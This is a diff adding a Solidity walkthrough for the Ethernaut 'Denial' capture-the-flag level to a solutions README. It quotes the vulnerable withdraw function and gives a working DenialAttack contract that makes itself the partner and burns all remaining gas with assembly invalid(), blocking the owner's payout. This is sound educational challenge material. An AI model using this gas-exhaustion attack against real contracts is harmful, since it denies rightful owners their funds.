@@ -22,6 +22,7 @@
 17. [Recovery](#17---recovery)
 18. [MagicNumber](#18---magicnumber)
 19. [Alien Codex](#19---alien-codex)
+20. [Denial](#20---denial)
     
 ## 01 - Fallback
 
@@ -602,3 +603,50 @@ contract AlienCodexAttack {
 ```
 
 [Attack Contract](./contracts/AlienCodex.sol) | [Test script](./test/AlienCodex.test.js)
+
+## 20 - Denial
+
+To solve this challenge, we need to prevent the owner from receiving ether when someone calls the `withdraw` function.
+The `withdraw` function's logic is as follows:
+```sol
+function withdraw() public {
+   uint amountToSend = address(this).balance / 100;
+   // perform a call without checking return
+   // The recipient can revert, the owner will still get their share
+   partner.call{value:amountToSend}("");
+   payable(owner).transfer(amountToSend);
+   // keep track of last withdrawal time
+   timeLastWithdrawn = block.timestamp;
+   withdrawPartnerBalances[partner] +=  amountToSend;
+}
+```
+We notice that 1% of the contract's balance is transferred first to the partner, and then to the owner. We can simply become partner by calling the function `setWithdrawPartner` and passing our address
+```sol
+function setWithdrawPartner(address _partner) public {
+   partner = _partner;
+}
+```
+After we become the partner, **we have control of the first ether transfer**: `partner.call{value:amountToSend}("");`.<br />
+`call` low-level method consumes almost all the gas of the transaction(63/64), so we can create an attacking contract that becomes a partner, and consumes all the gas of the transaction when it receives ether, which will result in reverting the initial transaction, and thus, the owner will not receive ether.
+
+```sol
+contract DenialAttack {
+
+   constructor(Denial _target) {
+      _target.setWithdrawPartner(address(this));
+   }
+
+   receive() external payable {
+      assembly{
+         invalid()
+      }
+      // `invalid` consumes all the remaining gas
+
+      // while(true) {}
+   }
+}
+```
+> NOTE1: to consume all the gas, we can use an infinite loop or the invalid() function of assembly
+> NOTE2: starting from version ^0.8.0, assert(false) doesn't consume all the remaining gas
+
+[Attack Contract](./contracts/Denial.sol) | [Test script](./test/Denial.test.js)
